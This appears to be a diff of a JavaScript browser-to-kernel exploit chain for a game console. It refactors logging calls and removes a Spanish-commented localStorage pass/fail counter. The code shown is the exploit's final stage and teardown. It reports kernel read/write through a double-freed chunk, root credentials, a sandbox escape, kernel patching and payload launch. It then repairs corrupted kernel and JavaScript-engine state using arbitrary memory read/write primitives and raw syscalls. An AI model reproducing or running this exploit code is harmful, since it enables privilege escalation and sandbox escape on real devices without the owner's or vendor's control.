-                            __exploitBridge.mark("KERNELVIEW-THREW", (e && e.message)
+                            mark("KERNELVIEW-THREW", (e && e.message)
                                 ? e.message : String(e));
-                            __exploitBridge.mark("KERNELVIEW-ABORTED", "the pipe primitive did "
+                            mark("KERNELVIEW-ABORTED", "the pipe primitive did "
                                 + "not come up. Nothing below depends on it and "
                                 + "the kernel R/W proofs above still stand.");
                         }
                 } else {
-                    __exploitBridge.mark("FASTRW-SKIPPED", "no pipe struct addresses -- curproc "
+                    mark("FASTRW-SKIPPED", "no pipe struct addresses -- curproc "
                         + "was unavailable, so the ofiles walk never ran and "
                         + "there is nothing to aim the pipebuf at");
                 }
 
-                __exploitBridge.mark("STAGE-5-DONE", "karw=pktopts-fd" + pktoptsTwins[0]
+                mark("STAGE-5-DONE", "karw=pktopts-fd" + pktoptsTwins[0]
                     + " kv=" + (kv ? "up" : "down"));
 
                 return true;
@@ -3644,306 +3547,271 @@ try {
             check("stage 2 completed", leakOk, "");
 
         } else if (committed) {
-            __exploitBridge.mark("DANGLING", "the chunk was freed twice and NOT reclaimed. "
+            mark("DANGLING", "the chunk was freed twice and NOT reclaimed. "
                 + "kernel data may alias it. reboot the console now.");
             rebootRequired = true;
         }
 
-        // ============================================
-  // CONTADORES PASS/FAIL - ACTUALIZACIÓN CORREGIDA
-  // ============================================
-  if (payloadRunning || kpatched || jailbroken || repaired) {
-      // ÉXITO - Incrementar Pass
-      if (localStorage.passCounter == null || localStorage.passCounter == undefined) {
-          localStorage.passCounter = 0;
-      }
-      localStorage.passCounter = parseInt(localStorage.passCounter) + 1;
-      document.getElementById("passCounter").innerHTML = localStorage.passCounter;
-      __exploitBridge.mark("PASS-COUNT", localStorage.passCounter);
+        mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
+        if (twins) {
+            mark("VERDICT", payloadRunning
+                ? "karw=1 root=1 sandbox=escaped kpatch=1 payload=1 reboot=0"
+                : kpatched
+                ? "karw=1 root=1 sandbox=escaped kpatch=1 payload=0"
+                : jailbroken
+                ? "karw=1 root=1 sandbox=escaped kpatch=0"
+                : repaired
+                ? "karw=1 repair=1 root=0"
+                : kv
+                ? "karw=1 repair=0 root=0"
+                : "doublefree=1 reclaim=1 karw=pktopts kv=0");
 
-      // MARCAR COMO COMPLETADO
-      window._exploitCompleted = true;
-  localStorage.setItem("exploitCompletado", "true");
-  localStorage.setItem("exploitTimestamp", Date.now().toString());
-      __exploitBridge.mark("EXPLOIT-MARCADO", "Completado - Pass=" + localStorage.passCounter);
+            state(repaired ? "REPAIRED -- tearing down..."
+                : kv ? "KERNELVIEW LIVE -- REBOOT"
+                     : "DOUBLE FREE ACHIEVED -- REBOOT", "warn");
+            if (jailbroken) mark("JAILBROKEN", "uid=0 cr_sceAuthId=SYSCORE "
+                + "cr_sceCaps=-1 fd_rdir=rootvnode fd_jdir=rootvnode");
+        } else if (committed) {
+            state("FREED BUT NOT RECLAIMED -- REBOOT NOW", "bad");
+        } else if (failCount === 0) {
+            state("no win in " + attemptsUsed + " attempts", "warn");
+        } else {
+            state("see log", "bad");
+        }
 
-      // ACTUALIZAR UI
-      if (window.actualizarContadores) {
-          window.actualizarContadores();
-      }
+    } catch (e) {
+        mark("STEP4D-FAILED", (e && e.message) ? e.message : String(e));
+        mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
+        state("FAILED -- see log", "bad");
+    } finally {
 
-  } else if (committed || failCount > 0 || rebootRequired) {
-      // FALLO - Incrementar Fail
-      if (localStorage.failCounter == null || localStorage.failCounter == undefined) {
-          localStorage.failCounter = 0;
-      }
-      localStorage.failCounter = parseInt(localStorage.failCounter) + 1;
-      document.getElementById("failCounter").innerHTML = localStorage.failCounter;
-      __exploitBridge.mark("FAIL-COUNT", localStorage.failCounter);
+        const teardown = !committed || repaired;
+        try {
+            if (!teardown) {
+                mark("CLEANUP-SKIPPED", "the 0x80 chunk was freed twice and the "
+                    + "repair did not verify. every further syscall is another "
+                    + "chance for the kernel to touch it, so nothing is torn "
+                    + "down beyond the scheduler and the userland corruptions.");
+            } else if (sc && mFunctionPatched) {
 
-      // ACTUALIZAR UI
-      if (window.actualizarContadores) {
-          window.actualizarContadores();
-      }
-  }
+                let n = 0;
+                for (let i = 0; i < openFds.length; ++i)
+                    if (openFds[i] > 0 && sc(SYS.close, openFds[i]).i32 === 0) n++;
+                mark("FDS-CLOSED", n + "/" + openFds.length + " block/loopback fds"
+                    + (pipeFdsHeld ? "   pipes " + pipeFdsHeld
+                        + " deliberately left open, +1 reference each" : ""));
+            }
+        } catch (e) {
+            mark("FD-CLEANUP-FAILED", (e && e.message) ? e.message : String(e));
+        }
+        try {
+            if (sc && mFunctionPatched && liveAioIds.length && teardown) {
+                const idBuf = new ArrayBuffer(AIO_MAX_NUM * 4);
+                const idDv = new DataView(idBuf);
+                const idAddr = (function () {
+                    const cell = p.leakval(idBuf);
+                    const impl = p.read8(cell.add32(0x10));
+                    return p.read8(impl.add32(0x10));
+                })();
+                const outBuf = new ArrayBuffer(AIO_MAX_NUM * 4);
+                const outAddr = (function () {
+                    const cell = p.leakval(outBuf);
+                    const impl = p.read8(cell.add32(0x10));
+                    return p.read8(impl.add32(0x10));
+                })();
+                keepAlive.push(idBuf, idDv, outBuf);
+                let done = 0;
+                for (let i = 0; i < liveAioIds.length; i += AIO_MAX_NUM) {
+                    const step = Math.min(AIO_MAX_NUM, liveAioIds.length - i);
+                    for (let j = 0; j < step; ++j)
+                        idDv.setUint32(j * 4, liveAioIds[i + j], true);
+                    sc(SYS.aio_multi_poll, idAddr, step, outAddr);
+                    sc(SYS.aio_multi_delete, idAddr, step, outAddr);
+                    done += step;
+                }
+                mark("AIO-CLEANED", done + " sprayed ids deleted exactly once");
+            }
+        } catch (e) {
+            mark("AIO-CLEANUP-FAILED", (e && e.message) ? e.message : String(e));
+        }
 
-  __exploitBridge.mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
-  if (twins) {
-      __exploitBridge.mark("VERDICT", payloadRunning
-          ? "karw=1 root=1 sandbox=escaped kpatch=1 payload=1 reboot=0"
-          : kpatched
-          ? "karw=1 root=1 sandbox=escaped kpatch=1 payload=0"
-          : jailbroken
-          ? "karw=1 root=1 sandbox=escaped kpatch=0"
-          : repaired
-          ? "karw=1 repair=1 root=0"
-          : kv
-          ? "karw=1 repair=0 root=0"
-          : "doublefree=1 reclaim=1 karw=pktopts kv=0");
+        try {
+            if (teardown && sc && mFunctionPatched) {
+                let n = 0;
+                for (let i = 0; i < ipv6Socks.length; ++i)
+                    if (ipv6Socks[i] > 0 && sc(SYS.close, ipv6Socks[i]).i32 === 0) n++;
+                mark("IPV6-SOCKS-CLOSED", n + "/" + ipv6Socks.length
+                    + " reclaim sockets; each still owned its own rthdr");
+            }
+        } catch (e) {
+            mark("IPV6-CLOSE-FAILED", (e && e.message) ? e.message : String(e));
+        }
+        try {
+            if (teardown && sc && mFunctionPatched && pktoptsTwins.length) {
 
-      __exploitBridge.state(repaired ? "REPAIRED -- tearing down..."
-          : kv ? "KERNELVIEW LIVE -- REBOOT"
-               : "DOUBLE FREE ACHIEVED -- REBOOT");
-      if (jailbroken) __exploitBridge.mark("JAILBROKEN", "uid=0 cr_sceAuthId=SYSCORE "
-          + "cr_sceCaps=-1 fd_rdir=rootvnode fd_jdir=rootvnode");
-  } else if (committed) {
-      __exploitBridge.state("FREED BUT NOT RECLAIMED -- REBOOT NOW");
-  } else if (failCount === 0) {
-      __exploitBridge.state("no win in " + attemptsUsed + " attempts");
-  } else {
-      __exploitBridge.state("see log");
-  }
+                const r = [];
+                for (let i = 0; i < pktoptsTwins.length; ++i)
+                    if (pktoptsTwins[i] > 0)
+                        r.push(pktoptsTwins[i] + ":"
+                            + sc(SYS.close, pktoptsTwins[i]).i32);
+                mark("PKTOPTS-TWINS-CLOSED", r.join("  ")
+                    + "   (fd " + pktoptsTwins[0] + " is the single free of the "
+                    + "0x100 chunk at " + (repaired ? "the audited address" : "?")
+                    + ")");
+            }
+        } catch (e) {
+            mark("PKTOPTS-CLOSE-FAILED", (e && e.message) ? e.message : String(e));
+        }
+        try {
+            if (teardown && sc && mFunctionPatched && twinSocks.length) {
+                const r = [];
+                for (let i = 0; i < twinSocks.length; ++i)
+                    if (twinSocks[i] > 0)
+                        r.push(twinSocks[i] + ":" + sc(SYS.close, twinSocks[i]).i32);
+                mark("RTHDR-TWINS-CLOSED", r.join("  ")
+                    + "   (rthdr nulled, so the 0x80 chunk is freed by nobody "
+                    + "and leaks)");
+            }
+        } catch (e) {
+            mark("RTHDR-CLOSE-FAILED", (e && e.message) ? e.message : String(e));
+        }
 
-} catch (e) {
-  __exploitBridge.mark("STEP4D-FAILED", (e && e.message) ? e.message : String(e));
-  __exploitBridge.mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
-  __exploitBridge.state("FAILED -- see log");
-} finally {
+        try {
+            if (teardown && kvProbe) {
+                const r = kvProbe();
+                mark("POST-CLEANUP-READ", "kv reads " + (r.word || "null")
+                    + " as '" + r.str + "' after every socket is closed");
+                check("kernel-r-w-primitive-survives",
+                    r.str === "evf cv", "got '" + r.str + "'");
+                cleanupDone = r.str === "evf cv";
 
-  const teardown = !committed || repaired;
-  try {
-      if (!teardown) {
-          __exploitBridge.mark("CLEANUP-SKIPPED", "the 0x80 chunk was freed twice and the "
-              + "repair did not verify. every further syscall is another "
-              + "chance for the kernel to touch it, so nothing is torn "
-              + "down beyond the scheduler and the userland corruptions.");
-      } else if (sc && mFunctionPatched) {
+                let soak = 0;
+                for (let i = 0; i < 10; ++i) {
+                    await new Promise(function (res) { setTimeout(res, 200); });
+                    if (sc(SYS.getpid).i32 > 0 && kvProbe().str === "evf cv") soak++;
+                }
+                mark("SOAK", soak + "/10 checks over 2 s: getpid and an 8-byte "
+                    + "kernel read both still work");
+                check("console-standing-2-s-after",
+                    soak === 10, soak + "/10");
+            } else if (teardown) {
+                cleanupDone = true;
+                mark("POST-CLEANUP", "no kv probe was installed, so cleanup is "
+                    + "unproven beyond the close() return values");
+            }
+        } catch (e) {
+            mark("POST-CLEANUP-FAILED", (e && e.message) ? e.message : String(e));
+        }
 
-          let n = 0;
-          for (let i = 0; i < openFds.length; ++i)
-              if (openFds[i] > 0 && sc(SYS.close, openFds[i]).i32 === 0) n++;
-          __exploitBridge.mark("FDS-CLOSED", n + "/" + openFds.length + " block/loopback fds"
-              + (pipeFdsHeld ? "   pipes " + pipeFdsHeld
-                  + " deliberately left open, +1 reference each" : ""));
-      }
-  } catch (e) {
-      __exploitBridge.mark("FD-CLEANUP-FAILED", (e && e.message) ? e.message : String(e));
-  }
-  try {
-      if (sc && mFunctionPatched && liveAioIds.length && teardown) {
-          const idBuf = new ArrayBuffer(AIO_MAX_NUM * 4);
-          const idDv = new DataView(idBuf);
-          const idAddr = (function () {
-              const cell = p.leakval(idBuf);
-              const impl = p.read8(cell.add32(0x10));
-              return p.read8(impl.add32(0x10));
-          })();
-          const outBuf = new ArrayBuffer(AIO_MAX_NUM * 4);
-          const outAddr = (function () {
-              const cell = p.leakval(outBuf);
-              const impl = p.read8(cell.add32(0x10));
-              return p.read8(impl.add32(0x10));
-          })();
-          keepAlive.push(idBuf, idDv, outBuf);
-          let done = 0;
-          for (let i = 0; i < liveAioIds.length; i += AIO_MAX_NUM) {
-              const step = Math.min(AIO_MAX_NUM, liveAioIds.length - i);
-              for (let j = 0; j < step; ++j)
-                  idDv.setUint32(j * 4, liveAioIds[i + j], true);
-              sc(SYS.aio_multi_poll, idAddr, step, outAddr);
-              sc(SYS.aio_multi_delete, idAddr, step, outAddr);
-              done += step;
-          }
-          __exploitBridge.mark("AIO-CLEANED", done + " sprayed ids deleted exactly once");
-      }
-  } catch (e) {
-      __exploitBridge.mark("AIO-CLEANUP-FAILED", (e && e.message) ? e.message : String(e));
-  }
+        try {
+            if (sc && mFunctionPatched && savedMask && savedPrio && restoreCtx) {
+                const mb = restoreCtx.maskBuf, pb = restoreCtx.prioBuf;
+                const ID = new int64(0xffffffff, 0xffffffff);
+                mb.u8.fill(0);
+                mb.dv.setUint32(0, savedMask.low, true);
+                mb.dv.setUint32(4, savedMask.hi, true);
+                const ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH,
+                    CPU_WHICH_TID, ID, 0x10, mb.addr).i32;
+                pb.dv.setUint16(0, savedPrio[0], true);
+                pb.dv.setUint16(2, savedPrio[1], true);
+                const pr = sc(SYS.rtprio_thread, RTP_SET, 0, pb.addr).i32;
 
-  try {
-      if (teardown && sc && mFunctionPatched) {
-          let n = 0;
-          for (let i = 0; i < ipv6Socks.length; ++i)
-              if (ipv6Socks[i] > 0 && sc(SYS.close, ipv6Socks[i]).i32 === 0) n++;
-          __exploitBridge.mark("IPV6-SOCKS-CLOSED", n + "/" + ipv6Socks.length
-              + " reclaim sockets; each still owned its own rthdr");
-      }
-  } catch (e) {
-      __exploitBridge.mark("IPV6-CLOSE-FAILED", (e && e.message) ? e.message : String(e));
-  }
-  try {
-      if (teardown && sc && mFunctionPatched && pktoptsTwins.length) {
+                mb.u8.fill(0);
+                sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
+                    ID, 0x10, mb.addr);
+                const backMask = new int64(mb.dv.getUint32(0, true),
+                                           mb.dv.getUint32(4, true));
+                pb.dv.setUint16(0, 0xffff, true);
+                pb.dv.setUint16(2, 0xffff, true);
+                sc(SYS.rtprio_thread, RTP_LOOKUP, 0, pb.addr);
+                const backPrio = [pb.dv.getUint16(0, true), pb.dv.getUint16(2, true)];
+                const good = sameI64(backMask, savedMask)
+                    && backPrio[0] === savedPrio[0] && backPrio[1] === savedPrio[1];
+                mark("THREAD-ATTRS-RESTORED",
+                    "affinity set=" + ar + " reads " + backMask
+                    + "   rtprio set=" + pr + " reads {" + backPrio + "}"
+                    + "   wanted " + savedMask + " {" + savedPrio + "}"
+                    + (good ? "  ok" : "  MISMATCH -- the next page load will "
+                       + "run on a mis-scheduled main thread"));
+            }
+        } catch (e) {
+            mark("THREAD-ATTRS-RESTORE-FAILED", (e && e.message) ? e.message : String(e));
+        }
+        try {
+            if (workerArmed && rpc) {
+                const d = await rpc("disarm");
+                mark("WORKER-DISARMED", "restored=" + d.restored
+                    + " expm1(1)=" + d.expm1);
+                workerArmed = false;
+            }
+        } catch (e) {
+            mark("WORKER-DISARM-FAILED", (e && e.message) ? e.message : String(e));
+        }
+        try {
+            if (workerWired && window.p && wMasterAddr && origWorkerVector) {
+                window.p.write8(wMasterAddr.add32(0x10), origWorkerVector);
+                workerWired = false;
+                mark("WORKER-UNWIRED", "master.m_vector restored");
+            }
+        } catch (e) {
+            mark("WORKER-UNWIRE-FAILED", (e && e.message) ? e.message : String(e));
+        }
+        try {
+            if (cellCorrupted && window.p && mainPivotAddr && mainSavedCell) {
+                window.p.write8(mainPivotAddr, mainSavedCell);
+                cellCorrupted = false;
+                mark("JSCELL-RESTORED", "late -- the window was left open");
+            }
+        } catch (e) { }
+        try {
+            if (mFunctionPatched && window.p && execAddr && origNative) {
+                const a = execAddr.add32(0x28);
+                window.p.write8(a, origNative);
+                mFunctionPatched = false;
+                const back = window.p.read8(a);
+                const v = Math.expm1(1);
+                mark("EXPM1-RESTORED", "m_function=" + back
+                    + (sameI64(back, origNative) ? " ok" : " MISMATCH")
+                    + "  expm1(1)=" + v
+                    + (Math.abs(v - 1.718281828459045) < 1e-12 ? " ok" : " WRONG"));
+            }
+        } catch (e) {
+            mark("EXPM1-RESTORE-FAILED", (e && e.message) ? e.message : String(e));
+        }
 
-          const r = [];
-          for (let i = 0; i < pktoptsTwins.length; ++i)
-              if (pktoptsTwins[i] > 0)
-                  r.push(pktoptsTwins[i] + ":" + sc(SYS.close, pktoptsTwins[i]).i32);
-          __exploitBridge.mark("PKTOPTS-TWINS-CLOSED", r.join("  ")
-              + "   (fd " + pktoptsTwins[0] + " is the single free of the "
-              + "0x100 chunk at " + (repaired ? "the audited address" : "?")
-              + ")");
-      }
-  } catch (e) {
-      __exploitBridge.mark("PKTOPTS-CLOSE-FAILED", (e && e.message) ? e.message : String(e));
-  }
-  try {
-      if (teardown && sc && mFunctionPatched && twinSocks.length) {
-          const r = [];
-          for (let i = 0; i < twinSocks.length; ++i)
-              if (twinSocks[i] > 0)
-                  r.push(twinSocks[i] + ":" + sc(SYS.close, twinSocks[i]).i32);
-          __exploitBridge.mark("RTHDR-TWINS-CLOSED", r.join("  ")
-              + "   (rthdr nulled, so the 0x80 chunk is freed by nobody "
-              + "and leaks)");
-      }
-  } catch (e) {
-      __exploitBridge.mark("RTHDR-CLOSE-FAILED", (e && e.message) ? e.message : String(e));
-  }
+        mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount
+            + " (incl. teardown)");
 
-  try {
-      if (teardown && kvProbe) {
-          const r = kvProbe();
-          __exploitBridge.mark("POST-CLEANUP-READ", "kv reads " + (r.word || "null")
-              + " as '" + r.str + "' after every socket is closed");
-          check("kernel-r-w-primitive-survives",
-              r.str === "evf cv", "got '" + r.str + "'");
-          cleanupDone = r.str === "evf cv";
-
-          let soak = 0;
-          for (let i = 0; i < 10; ++i) {
-              await new Promise(function (res) { setTimeout(res, 200); });
-              if (sc(SYS.getpid).i32 > 0 && kvProbe().str === "evf cv") soak++;
-          }
-          __exploitBridge.mark("SOAK", soak + "/10 checks over 2 s: getpid and an 8-byte "
-              + "kernel read both still work");
-          check("console-standing-2-s-after",
-              soak === 10, soak + "/10");
-      } else if (teardown) {
-          cleanupDone = true;
-          __exploitBridge.mark("POST-CLEANUP", "no kv probe was installed, so cleanup is "
-              + "unproven beyond the close() return values");
-      }
-  } catch (e) {
-      __exploitBridge.mark("POST-CLEANUP-FAILED", (e && e.message) ? e.message : String(e));
-  }
-
-  try {
-      if (sc && mFunctionPatched && savedMask && savedPrio && restoreCtx) {
-          const mb = restoreCtx.maskBuf, pb = restoreCtx.prioBuf;
-          const ID = new int64(0xffffffff, 0xffffffff);
-          mb.u8.fill(0);
-          mb.dv.setUint32(0, savedMask.low, true);
-          mb.dv.setUint32(4, savedMask.hi, true);
-          const ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH,
-              CPU_WHICH_TID, ID, 0x10, mb.addr).i32;
-          pb.dv.setUint16(0, savedPrio[0], true);
-          pb.dv.setUint16(2, savedPrio[1], true);
-          const pr = sc(SYS.rtprio_thread, RTP_SET, 0, pb.addr).i32;
-
-          mb.u8.fill(0);
-          sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
-              ID, 0x10, mb.addr);
-          const backMask = new int64(mb.dv.getUint32(0, true),
-                                     mb.dv.getUint32(4, true));
-          pb.dv.setUint16(0, 0xffff, true);
-          pb.dv.setUint16(2, 0xffff, true);
-          sc(SYS.rtprio_thread, RTP_LOOKUP, 0, pb.addr);
-          const backPrio = [pb.dv.getUint16(0, true), pb.dv.getUint16(2, true)];
-          const good = sameI64(backMask, savedMask)
-              && backPrio[0] === savedPrio[0] && backPrio[1] === savedPrio[1];
-          __exploitBridge.mark("THREAD-ATTRS-RESTORED",
-              "affinity set=" + ar + " reads " + backMask
-              + "   rtprio set=" + pr + " reads {" + backPrio + "}"
-              + "   wanted " + savedMask + " {" + savedPrio + "}"
-              + (good ? "  ok" : "  MISMATCH -- the next page load will "
-                 + "run on a mis-scheduled main thread"));
-      }
-  } catch (e) {
-      __exploitBridge.mark("THREAD-ATTRS-RESTORE-FAILED", (e && e.message) ? e.message : String(e));
-  }
-  try {
-      if (workerArmed && rpc) {
-          const d = await rpc("disarm");
-          __exploitBridge.mark("WORKER-DISARMED", "restored=" + d.restored
-              + " expm1(1)=" + d.expm1);
-          workerArmed = false;
-      }
-  } catch (e) {
-      __exploitBridge.mark("WORKER-DISARM-FAILED", (e && e.message) ? e.message : String(e));
-  }
-  try {
-      if (workerWired && window.p && wMasterAddr && origWorkerVector) {
-          window.p.write8(wMasterAddr.add32(0x10), origWorkerVector);
-          workerWired = false;
-          __exploitBridge.mark("WORKER-UNWIRED", "master.m_vector restored");
-      }
-  } catch (e) {
-      __exploitBridge.mark("WORKER-UNWIRE-FAILED", (e && e.message) ? e.message : String(e));
-  }
-  try {
-      if (cellCorrupted && window.p && mainPivotAddr && mainSavedCell) {
-          window.p.write8(mainPivotAddr, mainSavedCell);
-          cellCorrupted = false;
-          __exploitBridge.mark("JSCELL-RESTORED", "late -- the window was left open");
-      }
-  } catch (e) { }
-  try {
-      if (mFunctionPatched && window.p && execAddr && origNative) {
-          const a = execAddr.add32(0x28);
-          window.p.write8(a, origNative);
-          mFunctionPatched = false;
-          const back = window.p.read8(a);
-          const v = Math.expm1(1);
-          __exploitBridge.mark("EXPM1-RESTORED", "m_function=" + back
-              + (sameI64(back, origNative) ? " ok" : " MISMATCH")
-              + "  expm1(1)=" + v
-              + (Math.abs(v - 1.718281828459045) < 1e-12 ? " ok" : " WRONG"));
-      }
-  } catch (e) {
-      __exploitBridge.mark("EXPM1-RESTORE-FAILED", (e && e.message) ? e.message : String(e));
-  }
-
-  __exploitBridge.mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount
-      + " (incl. teardown)");
-
-  const stillDirty = (rebootRequired || committed || committed2)
-      && !(repaired && cleanupDone);
-  if (stillDirty) {
-      __exploitBridge.mark("REBOOT-REQUIRED", (committed2 ? "TWO aliased pairs are live (0x80 rthdr " + "and 0x100 pktopts). " : "") + "do not keep browsing and do not close the "
-          + "browser normally. power the console off and back on.");
-      try {
-          __exploitBridge.state("REBOOT THE CONSOLE");
-      } catch (e) { }
-  } else if (repaired && cleanupDone) {
-      __exploitBridge.mark("SAFE-TO-EXIT", "chunkX=freed-once-by-fd" + pktoptsTwins[0]
-          + " chunkY=leaked-0x80 pipes=+1ref-each"
-          + " leaks=2-pipe-pairs+0x80");
-      __exploitBridge.mark("STEP-4Q-DONE", payloadRunning
-          ? "chain=complete leftovers=none"
-          : kpatched
-          ? "repaired, torn down, root, kernel patched -- but the payload "
-            + "did not start. It is mapped and verified; only the launch "
-            + "is missing."
-          : "the corrupted context is repaired and the environment is "
-            + "torn down" + (jailbroken ? ", and the process is root"
-              : "") + ". See the stage 8/9/10 marks for what is left.");
-      try {
-          __exploitBridge.state(payloadRunning
-              ? "ALL DONE"
-              : kpatched ? "ROOT + KERNEL PATCHED -- NO REBOOT"
-              : jailbroken ? "ROOT -- NO REBOOT NEEDED"
-              : "REPAIRED -- NO REBOOT NEEDED");
-      } catch (e) { }
-  }
-}
+        const stillDirty = (rebootRequired || committed || committed2)
+            && !(repaired && cleanupDone);
+        if (stillDirty) {
+            mark("REBOOT-REQUIRED", (committed2 ? "TWO aliased pairs are live (0x80 rthdr " + "and 0x100 pktopts). " : "") + "do not keep browsing and do not close the "
+                + "browser normally. power the console off and back on.");
+            try {
+                stateEl.textContent = "REBOOT THE CONSOLE";
+                stateEl.className = "bad";
+            } catch (e) { }
+        } else if (repaired && cleanupDone) {
+            mark("SAFE-TO-EXIT", "chunkX=freed-once-by-fd" + pktoptsTwins[0]
+                + " chunkY=leaked-0x80 pipes=+1ref-each"
+                + " leaks=2-pipe-pairs+0x80");
+            mark("STEP-4Q-DONE", payloadRunning
+                ? "chain=complete leftovers=none"
+                : kpatched
+                ? "repaired, torn down, root, kernel patched -- but the payload "
+                  + "did not start. It is mapped and verified; only the launch "
+                  + "is missing."
+                : "the corrupted context is repaired and the environment is "
+                  + "torn down" + (jailbroken ? ", and the process is root"
+                    : "") + ". See the stage 8/9/10 marks for what is left.");
+            try {
+                stateEl.textContent = payloadRunning
+                    ? "ALL DONE"
+                    : kpatched ? "ROOT + KERNEL PATCHED -- NO REBOOT"
+                    : jailbroken ? "ROOT -- NO REBOOT NEEDED"
+                    : "REPAIRED -- NO REBOOT NEEDED";
+                stateEl.className = "ok";
+            } catch (e) { }
+        }
+    }
 })();
